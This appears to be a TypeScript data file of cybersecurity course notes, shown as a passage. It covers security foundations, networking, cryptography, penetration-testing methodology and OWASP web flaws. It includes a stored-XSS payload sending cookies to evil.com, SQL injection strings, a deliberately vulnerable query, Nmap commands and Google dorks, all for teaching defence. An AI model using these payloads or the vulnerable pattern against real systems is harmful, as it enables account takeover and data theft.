import { RevisedLessonNotes } from '../types';

export const CYBER_REVISED_NOTES: Record<string, RevisedLessonNotes> = {
  // =========================================================================
  // LEVEL 1: FOUNDATIONS & DIGITAL SAFETY (SEC-101)
  // =========================================================================
  'sec101-w1': {
    topicSummary: 'Comprehensive foundations of Information Security, threat actor taxonomy, the CIA Triad pillars, and foundational security hygiene principles.',
    detailedSections: [
      {
        heading: '1. The Core Pillars: The CIA Triad',
        subheading: 'Confidentiality, Integrity, and Availability',
        content: 'The CIA Triad forms the foundational bedrock of all information security frameworks. Every security control, protocol, and policy is engineered to protect one or more of these three pillars.',
        bulletPoints: [
          'Confidentiality: Concealing private data from unauthorized entities using encryption (AES-256), Access Control Lists (ACLs), role-based permissions (RBAC), and multi-factor authentication.',
          'Integrity: Assuring that data remains completely unmodified, authentic, and trustworthy throughout transmission and storage. Preserved using cryptographic hashing (SHA-256), message authentication codes (HMAC), and digital signatures.',
          'Availability: Guaranteeing uninterrupted, timely access to digital resources for authorized users. Maintained through data redundancy, high-availability server clusters (RAID), automated daily backups, and DDoS mitigation scrubbing centers.'
        ],
        proTip: 'Exam Tip: If data is stolen or viewed without permission → Confidentiality breach. If data is altered or tampered with → Integrity breach. If systems are taken offline or destroyed → Availability breach.',
        keyTerms: [
          { term: 'Non-Repudiation', definition: 'The cryptographic assurance that a sender cannot deny having sent a message or initiated a transaction.' },
          { term: 'Attack Surface', definition: 'The total sum of all possible vulnerabilities and entry points across software, networks, and personnel that can be exploited.' },
          { term: 'Vulnerability vs. Threat vs. Risk', definition: 'Vulnerability is a weakness; Threat is a potential danger; Risk is the likelihood of a threat exploiting that weakness multiplied by its impact (Risk = Threat × Vulnerability × Impact).' }
        ]
      },
      {
        heading: '2. Threat Actor Archetypes & Motives',
        subheading: 'From Script Kiddies to Advanced Persistent Threats (APTs)',
        content: 'Cyber threat actors differ significantly in skills, funding, motivations, and operational sophistication.',
        bulletPoints: [
          'Script Kiddies: Inexperienced individuals using pre-written automated scripts with minimal understanding of underlying code.',
          'Hacktivists: Politically or ideologically motivated attackers seeking public exposure, defacement, or protest.',
          'Cyber Criminals: Profit-driven syndicates executing ransomware, financial theft, wire fraud, and credential harvesting.',
          'Advanced Persistent Threats (APTs): Nation-state sponsored intelligence operatives with immense funding executing stealthy, multi-year espionage campaigns.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2017 Equifax Data Breach',
      year: '2017',
      target: 'Equifax Credit Reporting Agency',
      attackVector: 'Unpatched Apache Struts web framework vulnerability (CVE-2017-5638)',
      impact: 'Personal and financial data of 147 million consumers exposed; over $1.4 billion in remediation and settlement costs.',
      lessonLearned: 'Rapid patch management, vulnerability scanning, and strict network segmentation are vital to prevent unauthorized database querying.'
    },
    examCramChecklist: [
      'Master the definitions of Confidentiality, Integrity, and Availability with matching examples.',
      'Know the mathematical relationship: Risk = Threat × Vulnerability × Impact.',
      'Understand why security awareness training is essential for mitigating the human attack vector.',
      'Differentiate between Authentication (Who are you?) and Authorization (What permissions do you possess?).'
    ],
    memoryMnemonics: [
      'C-I-A: Confidentiality (Secret), Integrity (Accurate), Availability (Accessible).',
      'AAA Model: Authentication (Verify ID), Authorization (Check Permissions), Accounting (Audit Trail).'
    ]
  },

  'sec101-w2': {
    topicSummary: 'Deep-dive into password entropy mathematics, combinatorics, password hashing algorithms, and Multi-Factor Authentication (MFA) protocols.',
    detailedSections: [
      {
        heading: '1. Password Entropy & Cracking Mathematics',
        subheading: 'Why Length Defeats Complexity',
        content: 'Password entropy measures the computational randomness and unpredictability of a passphrase in bits ($H = L \\times \\log_2(N)$ where $L$ is length and $N$ is character pool size).',
        bulletPoints: [
          '8-character complex password (Upper + Lower + Digits + Symbols = 94 pool): $94^8 \\approx 6.09 \\times 10^{15}$ combinations (Cracked in seconds on modern GPU clusters).',
          '16-character diceware passphrase (4 random lowercase words = 26 pool or 7776 wordlist): $(7776)^4 \\approx 3.65 \\times 10^{15}$ combinations, but 20-character passphrase gives over 100 bits of entropy (Takes centuries to crack).',
          'Key Takeaway: Adding length increases computational complexity exponentially ($N^L$), whereas adding character classes only increases the base ($N$).'
        ],
        codeOrCommand: 'Entropy Formula: H = L * log2(N)\nExample: 16-char alphanumeric = 16 * log2(62) = 16 * 5.954 = 95.27 bits of entropy (Extremely Secure)'
      },
      {
        heading: '2. Multi-Factor Authentication (MFA) Pillars',
        subheading: 'Something you Know, Have, and Are',
        content: 'MFA requires verification across at least TWO distinct, independent authentication categories.',
        bulletPoints: [
          'Knowledge Factor: Something you know (Password, PIN, Secret Passphrase).',
          'Possession Factor: Something you have (Hardware FIDO2 Security Key, Smartphone Authenticator TOTP app, Smartcard).',
          'Inherence Factor: Something you are (Biometric Fingerprint, Facial recognition, Retina scan).',
          'Vulnerability Note: SMS 2FA is vulnerable to SIM-Swapping and SS7 network interception. Hardware tokens (WebAuthn/YubiKey) and time-based one-time passwords (TOTP RFC 6238) provide phishing-resistant protection.'
        ],
        keyTerms: [
          { term: 'Credential Stuffing', definition: 'Automated injection of leaked username/password combos across unrelated web portals where users reused credentials.' },
          { term: 'Salted Hash', definition: 'Adding a unique random string (salt) to a password before hashing with Bcrypt/Argon2 to defeat rainbow table attacks.' }
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2020 Twitter VIP Social Engineering & SIM-Swapping Breach',
      year: '2020',
      target: 'Twitter Internal Administrative Tools',
      attackVector: 'Phone-based voice phishing (Vishing) of employees combined with credential harvesting to hijack internal MFA tools.',
      impact: '130 high-profile verified accounts hijacked (Barack Obama, Elon Musk, Apple) to broadcast cryptocurrency scams.',
      lessonLearned: 'SMS and verbal 2FA are vulnerable to human manipulation; hardware-bound FIDO2 security keys prevent credential forwarding.'
    },
    examCramChecklist: [
      'Identify the 3 classic authentication factors: Knowledge, Possession, Inherence.',
      'Explain why Diceware passphrases provide higher practical security than short complex codes.',
      'Explain how password salts and key derivation functions (PBKDF2/Argon2id) defeat rainbow tables.',
      'Distinguish between Brute-force attacks, Dictionary attacks, and Credential Stuffing.'
    ],
    memoryMnemonics: [
      'K-P-I: Know (Mind), Possess (Pocket), Inhere (Body).'
    ]
  },

  'sec101-w3': {
    topicSummary: 'Social engineering mechanisms, psychological exploitation triggers, phishing taxonomy, Business Email Compromise (BEC), and email header triage.',
    detailedSections: [
      {
        heading: '1. The Anatomy of Social Engineering',
        subheading: 'Exploiting Human Psychology Rather Than Software Bugs',
        content: 'Social engineering manipulates cognitive biases to deceive individuals into divulging sensitive data or executing unauthorized actions.',
        bulletPoints: [
          'Urgency & Scarcity: Creating false panics ("Your account will be suspended within 24 hours").',
          'Authority: Impersonating CEOs, law enforcement, IT directors, or government agencies.',
          'Consensus / Social Proof: Claiming "Everyone in the department has already completed this verification".',
          'Greed / Reciprocity: Offering free gift cards, crypto rewards, or unexpected financial inheritances.'
        ]
      },
      {
        heading: '2. Phishing Vectors & Technical Diagnostics',
        subheading: 'Spear Phishing, Whaling, Vishing, Smishing & Typo-Squatting',
        content: 'Attackers deploy diverse channels to bypass technical spam filters and deceive recipients.',
        bulletPoints: [
          'Spear Phishing: Highly personalized phishing targeting a specific individual using gathered OSINT data.',
          'Whaling: Spear phishing exclusively targeting C-suite executives and board directors.',
          'Vishing (Voice Phishing): Phone call scams using voice spoofing and deepfake AI.',
          'Smishing: Malicious SMS text messages containing shortened dangerous URLs.',
          'Typo-Squatting / Homograph Attack: Registering visual lookalike domains (e.g., `micros0ft.com` or using Cyrillic `а` in `apple.com`).',
          'Email Verification Protocols: SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC (Domain-based Message Authentication).'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: 'Shark Tank Judge Barbara Corcoran BEC Wire Fraud',
      year: '2020',
      target: 'Barbara Corcoran Real Estate Investment Fund',
      attackVector: 'Business Email Compromise (BEC) with a spoofed bookkeeper email address differing by one letter.',
      impact: '$388,700 fraudulently wired to a rogue foreign account before being frozen.',
      lessonLearned: 'Mandatory out-of-band secondary verification (voice/phone confirmation) for all wire transfers and bank changes.'
    },
    examCramChecklist: [
      'Recognize the red flags of phishing: mismatched sender domains, urgent tone, generic greetings, suspicious attachments (.exe, .scr, macro-enabled .docm).',
      'Explain how SPF, DKIM, and DMARC authenticate email legitimacy.',
      'Explain the protocol for reporting suspected social engineering incidents to the SOC.'
    ],
    memoryMnemonics: [
      'S-W-V-S: Spear (Targeted), Whaling (Executive), Vishing (Voice), Smishing (SMS).'
    ]
  },

  'sec101-w4': {
    topicSummary: 'Malware taxonomy, infection mechanisms, ransomware encryption models, anti-malware heuristics, sandbox analysis, and secure endpoint hygiene.',
    detailedSections: [
      {
        heading: '1. Malware Taxonomy & Classification',
        subheading: 'Viruses, Worms, Trojans, Ransomware, Spyware & Rootkits',
        content: 'Malicious software is classified by its replication mechanism, execution payload, and stealth capabilities.',
        bulletPoints: [
          'Virus: Malicious code requiring a host file and human user execution to propagate.',
          'Worm: Self-replicating autonomous malware that spreads across networks without human intervention (exploiting unpatched network service ports like SMB).',
          'Trojan Horse: Disguised as legitimate, desirable software while delivering a hidden backdoor payload (RAT).',
          'Ransomware: Encrypts victim files using asymmetric/symmetric cryptography (AES/RSA) and demands cryptocurrency ransom.',
          'Rootkit: Stealth malware that injects into kernel space (Ring 0) to conceal active processes, network connections, and files from operating system security tools.',
          'Keylogger / Spyware: Covertly monitors keystrokes, clipboard buffers, and webcam feeds to harvest credentials.'
        ]
      },
      {
        heading: '2. Defense-in-Depth for Endpoints',
        subheading: 'Heuristics, Behavioral Sandboxing & Principle of Least Privilege',
        content: 'Modern endpoint protection goes beyond simple static virus signatures.',
        bulletPoints: [
          'Behavioral EDR (Endpoint Detection & Response): Identifies anomalous memory manipulation, unauthorized shadow copy deletions (`vssadmin delete shadows`), and unexpected child processes (e.g. Word spawning PowerShell).',
          'Principle of Least Privilege (PoLP): Standard users must never run as local Administrators during daily computing.',
          '3-2-1 Backup Strategy: 3 copies of data, on 2 different media types, with 1 copy stored completely offsite/air-gapped.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2017 WannaCry Ransomware Epidemic',
      year: '2017',
      target: 'UK National Health Service (NHS), FedEx, 200,000+ computers across 150 nations',
      attackVector: 'EternalBlue exploit (MS17-010 SMBv1 vulnerability) weaponized with DoublePulsar backdoor.',
      impact: 'Hospitals crippled, ambulances diverted, and billions in damages until a researcher triggered the hardcoded domain kill-switch.',
      lessonLearned: 'Disable deprecated legacy protocols (SMBv1), apply security patches promptly, and maintain air-gapped immutable backups.'
    },
    examCramChecklist: [
      'Distinguish between a Virus (requires host + execution) and a Worm (self-replicating autonomous network spreader).',
      'Explain the 3-2-1 backup golden rule for ransomware resilience.',
      'Define Rootkits and explain why they operate at Ring 0 / kernel level.',
      'Understand the danger of running daily accounts with Local Admin privileges.'
    ],
    memoryMnemonics: [
      '3-2-1 Rule: 3 Copies, 2 Media Types, 1 Offsite/Cloud Air-Gapped.'
    ]
  },

  // =========================================================================
  // LEVEL 2: NETWORK DEFENSE & CRYPTOGRAPHY (SEC-201)
  // =========================================================================
  'sec201-w1': {
    topicSummary: 'The OSI 7-Layer and TCP/IP architectural models, packet encapsulation, TCP 3-way handshake mechanics, protocol vulnerabilities, and Layer 2/3 attacks.',
    detailedSections: [
      {
        heading: '1. The OSI 7-Layer Architecture & Attack Vectors',
        subheading: 'Mapping Security Vulnerabilities to Each Protocol Layer',
        content: 'Network defense requires understanding how data is encapsulated as it moves down the OSI stack from Layer 7 to Layer 1.',
        bulletPoints: [
          'Layer 7 (Application): HTTP, DNS, SSH, SMTP. Attacks: SQLi, XSS, HTTP flood.',
          'Layer 6 (Presentation): TLS/SSL, JPEG, ASCII. Attacks: SSL stripping, format exploits.',
          'Layer 5 (Session): NetBIOS, RPC, PPTP. Attacks: Session hijacking, token replay.',
          'Layer 4 (Transport): TCP, UDP. Attacks: SYN floods, port scanning, UDP reflection.',
          'Layer 3 (Network): IPv4, IPv6, ICMP, IPsec. Attacks: IP spoofing, Ping of Death, routing poisoning.',
          'Layer 2 (Data Link): Ethernet, MAC addresses, ARP, VLANs. Attacks: ARP poisoning/spoofing, MAC flooding, DHCP starvation.',
          'Layer 1 (Physical): Cables, Fiber, RF wireless, Hubs. Attacks: Wiretapping, RF jamming, rogue physical taps.'
        ],
        codeOrCommand: 'Standard Port Mappings:\n20/21: FTP | 22: SSH | 23: Telnet (Insecure) | 25: SMTP | 53: DNS | 80: HTTP | 443: HTTPS | 3389: RDP'
      },
      {
        heading: '2. TCP 3-Way Handshake & SYN Flood Vulnerability',
        subheading: 'SYN → SYN-ACK → ACK Mechanics',
        content: 'TCP ensures reliable connection-oriented packet delivery using sequence numbers and acknowledgment flags.',
        bulletPoints: [
          'Step 1: Client sends `SYN` (Synchronize) packet with initial sequence number ($ISN_C$).',
          'Step 2: Server allocates memory buffer and replies with `SYN-ACK` ($ISN_S$, $ACK = ISN_C + 1$).',
          'Step 3: Client completes handshake with `ACK` ($ACK = ISN_S + 1$).',
          'Attack Vulnerability: In a SYN Flood, an attacker sends thousands of spoofed SYN packets and never sends the final ACK, exhausting the server’s connection backlog table (TCB). Mitigated using SYN Cookies and TCP rate limiting.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2008 Dan Kaminsky DNS Cache Poisoning Vulnerability',
      year: '2008',
      target: 'Global Internet DNS Resolvers',
      attackVector: 'Predictable 16-bit DNS Transaction IDs combined with race condition spoofing to inject malicious IP mappings.',
      impact: 'Allowed attackers to silently redirect any domain traffic (banks, email) to malicious rogue servers.',
      lessonLearned: 'Adoption of Source Port Randomization (SPR) and cryptographic DNS Security Extensions (DNSSEC).'
    },
    examCramChecklist: [
      'Memorize all 7 OSI layers in order: Physical, Data Link, Network, Transport, Session, Presentation, Application.',
      'Explain the exact TCP 3-way handshake sequence (SYN, SYN-ACK, ACK).',
      'Explain how ARP Poisoning works on a local broadcast domain to execute Man-in-the-Middle (MitM) attacks.',
      'Identify standard well-known service ports: 22 (SSH), 53 (DNS), 80 (HTTP), 443 (HTTPS), 3389 (RDP).'
    ],
    memoryMnemonics: [
      'OSI Mnemonic (Top to Bottom): All People Seem To Need Data Processing (App, Pres, Sess, Trans, Net, Data, Phys).',
      'OSI Mnemonic (Bottom to Top): Please Do Not Throw Sausage Pizza Away.'
    ]
  },

  'sec201-w2': {
    topicSummary: 'Firewall architectures (Stateless, Stateful, NGFW), Intrusion Detection and Prevention Systems (IDS/IPS), DMZ topology, and network segmentation.',
    detailedSections: [
      {
        heading: '1. Firewall Technologies & Packet Filtering',
        subheading: 'From Stateless ACLs to Layer 7 Next-Generation Firewalls (NGFW)',
        content: 'Firewalls inspect and filter inbound and outbound traffic based on security policies.',
        bulletPoints: [
          'Stateless Packet Filters: Inspects individual packets in isolation based on Source/Destination IP, Port, and Protocol (Fast but vulnerable to spoofed TCP flags).',
          'Stateful Inspection Firewalls: Maintains a state table tracking active TCP/UDP connections; automatically permits inbound response packets if they match an established outbound session.',
          'Next-Generation Firewalls (NGFW): Deep Packet Inspection (DPI) at Layer 7, application awareness (e.g. distinguishing between WhatsApp text vs file transfer), integrated IDS/IPS, and TLS decryption inspection.'
        ]
      },
      {
        heading: '2. IDS vs. IPS & DMZ Perimeter Architecture',
        subheading: 'Signature vs. Anomaly Detection and Demilitarized Zones',
        content: 'IDS detects and alerts; IPS actively drops and blocks malicious traffic inline.',
        bulletPoints: [
          'IDS (Intrusion Detection System): Passive out-of-band network tap/SPAN port; generates alerts upon detecting known attack signatures.',
          'IPS (Intrusion Prevention System): Active inline deployment; immediately drops malicious packets, resets TCP connections, and dynamically updates firewall rules.',
          'Demilitarized Zone (DMZ): A segregated subnet located between the untrusted public Internet and the secure internal LAN. Hosts publicly accessible servers (Web, Mail, DNS) so that a compromise of the DMZ does not grant access to the internal network.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2013 Target Corporation Supply-Chain Network Breach',
      year: '2013',
      target: 'Target Point-of-Sale (POS) Systems (40 million credit cards stolen)',
      attackVector: 'Stolen credentials from a 3rd-party HVAC refrigeration contractor; lack of internal network segmentation allowed lateral movement from vendor billing portal to POS register networks.',
      impact: '$202 million total breach cost, CEO resignation, and massive PCI-DSS overhaul.',
      lessonLearned: 'Strict zero-trust microsegmentation and VLAN isolation between vendor networks and sensitive cardholder data environments (CDE).'
    },
    examCramChecklist: [
      'Compare Stateful firewalls (tracks connection table) vs Stateless ACLs (filters isolated packets).',
      'Explain the difference between IDS (passive detection/alerting) and IPS (active inline prevention/blocking).',
      'Explain the purpose and architecture of a Demilitarized Zone (DMZ).',
      'Explain how network microsegmentation limits lateral movement during a breach.'
    ],
    memoryMnemonics: [
      'IDS = Detects & Tells (Passive). IPS = Prevents & Stops (Active).'
    ]
  },

  'sec201-w3': {
    topicSummary: 'Symmetric encryption (AES, ChaCha20), Asymmetric public-key cryptography (RSA, ECC), Cryptographic hash functions (SHA-256, SHA-3), and Key Exchange protocols.',
    detailedSections: [
      {
        heading: '1. Symmetric vs. Asymmetric Cryptography',
        subheading: 'Speed vs. Key Distribution Mechanics',
        content: 'Modern cryptography combines symmetric and asymmetric algorithms into hybrid cryptosystems.',
        bulletPoints: [
          'Symmetric Encryption: Uses a single shared secret key for both encryption and decryption (AES-128/256, ChaCha20). Blazing fast; ideal for bulk data encryption at rest and in transit.',
          'Asymmetric Encryption: Uses mathematically linked key pairs: Public Key (freely distributed for encryption) and Private Key (kept secret for decryption and digital signing) (RSA-2048/4096, ECC Curve25519). Solves the key distribution problem.',
          'Hybrid Encryption: In TLS, asymmetric cryptography (ECDH) securely negotiates a session key, after which symmetric AES-256 encrypts all subsequent data transmission.'
        ],
        codeOrCommand: 'Cryptographic Hashing:\nInput: "Hello World" -> SHA-256 -> a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e\nAvalanche Effect: Changing one character completely alters >50% of output hash bits.'
      },
      {
        heading: '2. Cryptographic Hash Functions & Digital Signatures',
        subheading: 'One-Way Determinism, Collision Resistance & Non-Repudiation',
        content: 'Hash functions convert arbitrary data into a fixed-length string without a decryption key.',
        bulletPoints: [
          'Properties of Secure Hashes: Pre-image resistance (impossible to reverse $H \\to M$), Second pre-image resistance, and Collision resistance (impossible to find two distinct inputs with identical hash).',
          'Deprecated Hashes: MD5 (128-bit) and SHA-1 (160-bit) are broken due to practical collision attacks. Standard: SHA-256, SHA-512, and SHA-3 (Keccak).',
          'Digital Signatures: Sender encrypts a document’s hash with their PRIVATE key. Anyone verifies it using the sender’s PUBLIC key, providing Integrity, Authenticity, and Non-Repudiation.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2017 SHAttered SHA-1 Practical Collision Attack',
      year: '2017',
      target: 'SHA-1 Cryptographic Hash Standard',
      attackVector: 'Google and CWI researchers generated two different PDF documents with identical SHA-1 cryptographic hashes using $9 \\times 10^{18}$ computations.',
      impact: 'Forced the permanent retirement of SHA-1 from web certificates, digital signatures, and source control.',
      lessonLearned: 'Migrate immediately to collision-resistant hash families (SHA-256 or SHA-3) before mathematical attacks become commercially viable.'
    },
    examCramChecklist: [
      'Explain how Hybrid Encryption combines Asymmetric key exchange with Symmetric bulk encryption.',
      'State the role of Public vs Private keys in both Confidentiality (Encrypt with Receiver Public Key) and Digital Signatures (Sign with Sender Private Key).',
      'Explain why MD5 and SHA-1 are unsafe for cryptographic signatures.',
      'Explain Diffie-Hellman Key Exchange (ECDH) and Forward Secrecy.'
    ],
    memoryMnemonics: [
      'Public Encrypts, Private Decrypts (Confidentiality). Private Signs, Public Verifies (Authenticity).'
    ]
  },

  'sec201-w4': {
    topicSummary: 'Transport Layer Security (TLS 1.3), Public Key Infrastructure (PKI), X.509 Digital Certificates, Virtual Private Networks (IPsec & WireGuard), and Zero Trust Network Access (ZTNA).',
    detailedSections: [
      {
        heading: '1. TLS 1.3 Handshake & PKI Architecture',
        subheading: 'Certificate Authorities (CA), CRL/OCSP, and Perfect Forward Secrecy',
        content: 'TLS encrypts web communications across the public Internet.',
        bulletPoints: [
          'TLS 1.3 Handshake: Streamlined down to 1-RTT (Round Trip Time). Uses Ephemeral Diffie-Hellman (ECDHE) to ensure Perfect Forward Secrecy (PFS), meaning compromising a server private key in the future cannot decrypt past recorded sessions.',
          'Public Key Infrastructure (PKI): Hierarchical trust tree where Root Certificate Authorities (CAs) cryptographically sign Intermediate CAs, which in turn issue Leaf Certificates to domain servers.',
          'Revocation Checking: CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) with OCSP Stapling verify if a compromised certificate has been invalidated.'
        ]
      },
      {
        heading: '2. Virtual Private Networks (VPNs) & Zero Trust',
        subheading: 'IPsec, WireGuard & "Never Trust, Always Verify"',
        content: 'VPNs create encrypted tunnels over untrusted networks.',
        bulletPoints: [
          'IPsec (Internet Protocol Security): Operates at Layer 3. Utilizes Authentication Header (AH) for integrity and Encapsulating Security Payload (ESP) for encryption.',
          'WireGuard: Modern lightweight Layer 3 VPN protocol utilizing modern cryptography (ChaCha20-Poly1305, Curve25519) with a compact codebase (~4,000 lines).',
          'Zero Trust Architecture (NIST SP 800-207): Replaces traditional perimeter-based security ("castle-and-moat") with continuous identity verification, device health validation, and micro-segmented least privilege access.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: '2011 DigiNotar Rogue CA Compromise',
      year: '2011',
      target: 'Dutch Certificate Authority DigiNotar',
      attackVector: 'Hackers breached internal CA servers and minted over 500 fraudulent SSL certificates (including `*.google.com`).',
      impact: 'Rogue certificates used by Iranian state operatives for Man-in-the-Middle wiretaps on 300,000 Gmail users; DigiNotar completely dissolved in bankruptcy.',
      lessonLearned: 'Implementation of Certificate Transparency (CT) public logs and strict CA browser root validation.'
    },
    examCramChecklist: [
      'Explain Perfect Forward Secrecy (PFS) and why ephemeral key exchanges are mandatory in TLS 1.3.',
      'Explain the difference between IPsec Tunnel Mode (entire packet encrypted) and Transport Mode (only payload encrypted).',
      'Define the 3 core tenets of Zero Trust: Verify Explicitly, Use Least Privilege, Assume Breach.'
    ],
    memoryMnemonics: [
      'Zero Trust Golden Rule: Never Trust, Always Verify.'
    ]
  },

  // =========================================================================
  // LEVEL 3: ETHICAL HACKING & PENETRATION TESTING (SEC-301)
  // =========================================================================
  'sec301-w1': {
    topicSummary: 'Ethical hacking methodologies (NIST SP 800-115, PTES), Rules of Engagement (RoE), Open-Source Intelligence (OSINT), and passive footprinting.',
    detailedSections: [
      {
        heading: '1. Penetration Testing Frameworks & Legal Boundaries',
        subheading: 'PTES Phases, Scope, and Permission to Attack',
        content: 'Ethical hackers must operate under strict written authorization to prevent legal prosecution under computer crime statutes (CFAA).',
        bulletPoints: [
          'PTES (Penetration Testing Execution Standard) 7 Phases: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting.',
          'Rules of Engagement (RoE): Explicit document specifying authorized IP ranges, testing time windows, emergency contact protocols, and prohibited destructive exploits (e.g. DoS).',
          'Black Box (Zero knowledge), White Box (Full source code and architecture knowledge), Gray Box (Partial credentials/user access).'
        ]
      },
      {
        heading: '2. OSINT & Passive Reconnaissance',
        subheading: 'Gathering Intelligence Without Sending Packets to the Target',
        content: 'Passive reconnaissance gathers public data without triggering target firewalls or IDS logs.',
        bulletPoints: [
          'WHOIS & RDAP: Domain registrar records, IP address block assignments (ARIN, RIPE).',
          'DNS Enumeration: Subdomain discovery via Certificate Transparency logs (crt.sh), DNS records (A, MX, TXT, SPF).',
          'Google Dorking (Advanced Search): `site:target.com filetype:pdf confidential` or `site:target.com inurl:admin`.',
          'Shodan / Censys: Search engine scanning internet-connected devices, industrial SCADA controllers, and exposed open database ports.'
        ],
        codeOrCommand: 'Useful Passive & DNS Recon Tools:\nwhois target.com\ndig target.com ANY +noall +answer\nsublist3r -d target.com\nshodan search "org:TargetName"'
      }
    ],
    realWorldCaseStudy: {
      title: 'Capital One AWS S3 SSRF & Misconfiguration Breach',
      year: '2019',
      target: 'Capital One Financial Corp (100 million customer records)',
      attackVector: 'A former cloud engineer used reconnaissance to identify a misconfigured open-source WAF (ModSecurity) vulnerable to Server-Side Request Forgery (SSRF) to query AWS EC2 metadata credentials.',
      impact: 'Over $80 million in regulatory fines and $190 million settlement.',
      lessonLearned: 'Strict IMDSv2 adoption with session tokens and aggressive cloud IAM role permission boundary lockdown.'
    },
    examCramChecklist: [
      'Name all 7 PTES phases in chronological order.',
      'Explain the legal requirement of a signed Rules of Engagement (RoE) prior to testing.',
      'Differentiate between Passive Reconnaissance (no direct target interaction) and Active Reconnaissance (sending probe packets).'
    ],
    memoryMnemonics: [
      'P-I-T-V-E-P-R: Pre-engagement, Intel, Threat model, Vulnerability, Exploit, Post-exploit, Report.'
    ]
  },

  'sec301-w2': {
    topicSummary: 'Active network scanning, Nmap TCP SYN stealth scans, service fingerprinting, vulnerability assessment tools (OpenVAS, Nessus), and CVSS 3.1 scoring.',
    detailedSections: [
      {
        heading: '1. Nmap Scanning Switches & Packet Mechanics',
        subheading: 'Port States and TCP Flag Manipulation',
        content: 'Nmap is the industry standard for network discovery and vulnerability footprinting.',
        bulletPoints: [
          '`-sS` (TCP SYN Stealth Scan): Sends SYN; if SYN-ACK received, port is OPEN (sends immediate RST to avoid completing connection and bypasses simple application logging).',
          '`-sT` (TCP Connect Scan): Completes full 3-way handshake (used when non-root privileges prevent raw socket creation).',
          '`-sU` (UDP Scan): Sends UDP probes; if ICMP Port Unreachable received → Closed; no response → Open|Filtered.',
          '`-sV` (Version Detection): Interrogates open ports with signature probes to identify running daemon software and version numbers.',
          '`-O` (OS Fingerprinting): Analyzes TCP/IP stack implementation quirks (window size, TTL, IP ID sequences).'
        ],
        codeOrCommand: 'Essential Nmap Commands:\nnmap -sS -sV -O -p- 192.168.1.0/24\nnmap -sC -sV -p 80,443,22 target.com\nnmap --script vuln target.com'
      },
      {
        heading: '2. CVSS 3.1 Vulnerability Severity Scoring',
        subheading: 'Common Vulnerability Scoring System Equations',
        content: 'CVSS provides a standardized numerical score (0.0 to 10.0) reflecting vulnerability severity.',
        bulletPoints: [
          'None: 0.0 | Low: 0.1 – 3.9 | Medium: 4.0 – 6.9 | High: 7.0 – 8.9 | Critical: 9.0 – 10.0',
          'Base Metrics: Attack Vector (Network, Adjacent, Local, Physical), Attack Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required), Scope (Unchanged/Changed), and CIA Impact.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: 'SolarWinds Orion Supply-Chain Cyber Espionage (SUNBURST)',
      year: '2020',
      target: 'US Treasury, Homeland Security, Microsoft, 18,000+ organizations',
      attackVector: 'Russian APT29 infiltrated SolarWinds build pipelines and injected a backdoor trojan into official signed updates (`SolarWinds.Orion.Core.BusinessLayer.dll`).',
      impact: 'Unprecedented espionage visibility across top global government networks.',
      lessonLearned: 'Continuous software supply chain validation, multi-stage build hash verification, and zero-trust outbound network monitoring.'
    },
    examCramChecklist: [
      'Explain how `-sS` (SYN Stealth) differs from `-sT` (Connect scan).',
      'Explain the meaning of Nmap port states: Open, Closed, Filtered.',
      'State the CVSS 3.1 rating threshold for a Critical vulnerability (9.0 – 10.0).'
    ],
    memoryMnemonics: [
      'Nmap -sS: Half-Open, Half-Stealthy (Never sends the final ACK).'
    ]
  },

  'sec301-w3': {
    topicSummary: 'OWASP Top 10 web vulnerabilities, SQL Injection (SQLi), Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Insecure Direct Object References (IDOR), and Secure Coding.',
    detailedSections: [
      {
        heading: '1. SQL Injection (SQLi) & Defense Mechanisms',
        subheading: 'In-Band, Blind, and Time-Based SQLi',
        content: 'SQL injection occurs when untrusted user input is directly concatenated into database queries.',
        bulletPoints: [
          'Authentication Bypass: `SELECT * FROM users WHERE user = \'admin\' OR \'1\'=\'1\' --\' AND pass = \'...\'` returns true, logging the attacker in as admin.',
          'UNION-Based SQLi: Appending `UNION SELECT null, username, password FROM users --` to extract table data.',
          'Primary Defense (Paramount): Parameterized Queries / Prepared Statements (bind variables isolate data from SQL command logic), Object-Relational Mappers (ORM), and strict input validation.'
        ],
        codeOrCommand: '// VULNERABLE CODE (Never Use):\nquery = "SELECT * FROM users WHERE id = " + req.params.id;\n\n// SECURE PARAMETERIZED CODE:\nquery = db.prepare("SELECT * FROM users WHERE id = ?");\nquery.execute([req.params.id]);'
      },
      {
        heading: '2. Cross-Site Scripting (XSS) & CSRF',
        subheading: 'Stored, Reflected, DOM-Based XSS and Anti-CSRF Tokens',
        content: 'XSS injects client-side scripts into web pages viewed by other users.',
        bulletPoints: [
          'Stored XSS (Persistent): Malicious payload (`<script>document.location="http://evil.com/steal?c="+document.cookie</script>`) is saved into the database (comments section) and served to all future visitors.',
          'Reflected XSS: Malicious payload in URL query parameters is reflected immediately in the server response.',
          'DOM-Based XSS: Client-side JavaScript modifies the DOM with unsanitized `document.write` or `innerHTML`.',
          'Defenses: Context-aware HTML entity encoding, `HttpOnly` cookie flags (prevents JavaScript cookie access), Content Security Policy (CSP) headers, and Synchronizer CSRF tokens.'
        ]
      }
    ],
    realWorldCaseStudy: {
      title: 'Yahoo 3 Billion Accounts Database SQLi & Cookie Forgery',
      year: '2013-2016',
      target: 'Yahoo User Accounts (3 Billion identities compromised)',
      attackVector: 'Spear phishing followed by internal database querying and minting forged authentication cookies.',
      impact: '$350 million devaluation in Verizon acquisition price.',
      lessonLearned: 'Mandatory cryptographic session token hashing, database activity monitoring (DAM), and end-to-end encryption.'
    },
    examCramChecklist: [
      'Explain how Prepared Statements / Parameterized Queries completely prevent SQL Injection.',
      'Differentiate between Stored XSS (in database), Reflected XSS (in URL/response), and DOM XSS (in browser JavaScript).',
